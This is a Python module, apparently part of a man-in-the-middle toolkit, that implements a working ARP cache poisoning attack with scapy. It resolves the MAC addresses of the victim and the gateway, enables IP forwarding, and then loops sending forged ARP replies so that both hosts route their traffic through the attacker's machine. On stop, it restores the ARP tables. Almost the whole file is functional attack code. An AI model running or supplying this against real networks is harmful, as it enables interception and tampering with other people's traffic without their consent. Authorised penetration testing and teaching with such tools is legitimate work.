from scapy.all import *
import threading
import time
import logging
import subprocess
from utils import print_status, enable_ip_forwarding
import config
import socket
import netifaces
import os

class ARPPoisoner:
    def __init__(self, target_ip, gateway_ip, interface=config.INTERFACE):
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface
        self.running = False
        self.thread = None
        
        # Validate IP addresses
        if not self.target_ip or not self.gateway_ip:
            raise ValueError("Target IP and Gateway IP must be provided")
            
        print_status(f"Initializing ARP poisoner with target={target_ip}, gateway={gateway_ip}, interface={interface}", "info")
            
        # Validate and check interface
        if self.interface not in get_if_list():
            available_ifaces = get_if_list()
            print_status(f"Interface {self.interface} not found. Available interfaces: {available_ifaces}", "warning")
            # Try to use default interface as fallback
            if config.INTERFACE in available_ifaces:
                print_status(f"Falling back to default interface: {config.INTERFACE}", "info")
                self.interface = config.INTERFACE
            else:
                print_status(f"Using first available interface: {available_ifaces[0]}", "info")
                self.interface = available_ifaces[0]
        
        # Set up conf.iface
        old_iface = conf.iface
        conf.iface = self.interface
        print_status(f"Using interface: {self.interface}", "info")
        
        try:
            # Get MAC addresses
            print_status(f"Resolving MAC addresses...", "info")
            self.target_mac = getmacbyip(target_ip)
            self.gateway_mac = getmacbyip(gateway_ip)
            self.attacker_mac = get_if_hwaddr(self.interface)
            self.attacker_ip = get_if_addr(self.interface)
            
            # Restore original interface
            conf.iface = old_iface
            
            if not self.target_mac or not self.gateway_mac:
                raise ValueError(f"Could not resolve MAC addresses: target_mac={self.target_mac}, gateway_mac={self.gateway_mac}")
            
            # Safety check: Don't poison ourselves
            if target_ip == self.attacker_ip or gateway_ip == self.attacker_ip:
                raise ValueError("Cannot poison own machine's ARP cache")
            
            print_status(f"Target MAC: {self.target_mac}", "info")
            print_status(f"Gateway MAC: {self.gateway_mac}", "info")
            print_status(f"Attacker MAC: {self.attacker_mac}", "info")
            print_status(f"Attacker IP: {self.attacker_ip}", "info")

            # Enable IP forwarding
            if not enable_ip_forwarding():
                print_status("Failed to enable IP forwarding. Attack may not work properly.", "warning")
        except socket.gaierror as e:
            print_status(f"DNS resolution error: {str(e)}", "error")
            conf.iface = old_iface  # Restore original interface
            raise ValueError(f"DNS resolution error: {str(e)}")
        except OSError as e:
            print_status(f"Network interface error: {str(e)}", "error")
            conf.iface = old_iface  # Restore original interface
            raise ValueError(f"Network interface error: {str(e)}")
        except Exception as e:
            print_status(f"Initialization error: {str(e)}", "error")
            conf.iface = old_iface  # Restore original interface
            raise

    def start(self):
        """Start ARP poisoning attack."""
        if self.running:
            print_status("Attack already running", "warning")
            return False

        self.running = True
        self.thread = threading.Thread(target=self._poison)
        self.thread.daemon = True
        self.thread.start()
        print_status(f"Started ARP poisoning attack on {self.target_ip}", "success")
        return True

    def stop(self):
        """Stop ARP poisoning attack and restore ARP tables."""
        if not self.running:
            return False

        print_status("Stopping ARP poisoning attack...", "info")
        self.running = False
        
        if self.thread:
            # Wait for thread to stop
            try:
                self.thread.join(timeout=3)
            except Exception as e:
                print_status(f"Error joining thread: {e}", "warning")
        
        # Restore ARP tables
        self._restore_arp_tables()
        return True
        
    def _restore_arp_tables(self):
        """Restore ARP tables to their original state."""
        try:
            # Set interface in scapy
            old_iface = conf.iface
            conf.iface = self.interface
            
            print_status("Restoring ARP tables...", "info")
            
            # Re-resolve MAC addresses in case they've changed
            target_mac = None
            gateway_mac = None
            
            try:
                target_mac = getmacbyip(self.target_ip)
                gateway_mac = getmacbyip(self.gateway_ip)
            except Exception as e:
                print_status(f"Error re-resolving MAC addresses: {e}", "warning")
            
            if not target_mac or not gateway_mac:
                print_status("Could not resolve MAC addresses during cleanup. Using cached values.", "warning")
                target_mac = self.target_mac
                gateway_mac = self.gateway_mac
            
            # Send legitimate ARP replies to target
            for i in range(5):
                try:
                    send(ARP(op=2, pdst=self.target_ip, hwdst=target_mac, 
                            psrc=self.gateway_ip, hwsrc=gateway_mac), 
                         verbose=0, iface=self.interface)
                    
                    # Send legitimate ARP replies to gateway
                    send(ARP(op=2, pdst=self.gateway_ip, hwdst=gateway_mac, 
                            psrc=self.target_ip, hwsrc=target_mac), 
                         verbose=0, iface=self.interface)
                    
                    # Send gratuitous ARP to restore gateway's MAC
                    send(ARP(op=2, pdst="255.255.255.255", hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=self.gateway_ip, hwsrc=gateway_mac),
                         verbose=0, iface=self.interface)
                    
                    time.sleep(0.2)  # Small delay between restore packets
                except Exception as e:
                    print_status(f"Error sending ARP restore packet (attempt {i+1}): {e}", "warning")
            
            # Restore original interface
            conf.iface = old_iface
            print_status("Restored ARP tables", "success")
        except Exception as e:
            # Restore original interface
            conf.iface = old_iface
            print_status(f"Error restoring ARP tables: {e}", "error")
            logging.error(f"Error restoring ARP tables: {e}")

    def _poison(self):
        """Main poisoning loop."""
        # Set interface in scapy
        old_iface = conf.iface
        conf.iface = self.interface
        
        try:
            while self.running:
                try:
                    # Poison target to think we're the gateway
                    send(ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac,
                            psrc=self.gateway_ip, hwsrc=self.attacker_mac),
                         verbose=0, iface=self.interface)
                    
                    # Poison gateway to think we're the target
                    send(ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                            psrc=self.target_ip, hwsrc=self.attacker_mac),
                         verbose=0, iface=self.interface)
                    
                    time.sleep(config.ARP_POISON_INTERVAL)
                except socket.gaierror as e:
                    print_status(f"DNS resolution error in ARP poisoning: {str(e)}", "error")
                    logging.error(f"DNS resolution error in ARP poisoning: {str(e)}")
                    self.running = False
                    break
                except Exception as e:
                    print_status(f"Error in ARP poisoning: {e}", "error")
                    logging.error(f"Error in ARP poisoning: {e}")
                    self.running = False
                    break
        finally:
            # Restore original interface
            conf.iface = old_iface

def run_attack(target_ip, gateway_ip, interface=None):
    """Run ARP poisoning attack with proper cleanup."""
    try:
        if not interface:
            interface = config.INTERFACE
            
        poisoner = ARPPoisoner(target_ip, gateway_ip, interface)
        poisoner.start()
        
        # Keep the main thread alive
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("\nStopping attack...", "warning")
            poisoner.stop()
            
    except Exception as e:
        print_status(f"Error: {e}", "error")
        logging.error(f"Error in ARP poisoning attack: {e}")
        return False
    
    return True 